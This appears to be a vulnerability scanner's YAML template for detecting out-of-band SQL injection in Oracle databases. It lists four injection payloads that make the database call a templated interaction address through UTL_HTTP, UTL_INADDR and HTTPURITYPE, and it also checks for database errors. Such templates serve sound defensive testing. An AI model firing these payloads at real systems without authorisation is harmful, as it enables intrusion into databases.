id: "sqli-oob-oracle"
issue_code: sql_injection
detection_condition: or
detection_methods:
  - oob_interaction:
      oob_address: "{{.oob_address}}"
      confidence: 95
  - response_check:
      check: database_error
      confidence: 85
vars:
  - name: oob_address
    value: "{{interactionAddress}}"
launch:
  operator: or
  conditions:
    - type: platform
      value: oracle
    - type: platform
      value: java
    - type: scan_mode
      value: fuzz
templates:
  - "' AND UTL_HTTP.REQUEST('http://{{.oob_address}}/')='1'--"
  - "1' AND UTL_HTTP.REQUEST('http://{{.oob_address}}/')='1'--"
  - "' AND UTL_INADDR.GET_HOST_ADDRESS('{{.oob_address}}')='1'--"
  - "'||(SELECT HTTPURITYPE('http://{{.oob_address}}/').GETCLOB() FROM dual)||'"
categories:
  - sql_injection
  - oob
  - oracle
platforms:
  - oracle
  - java
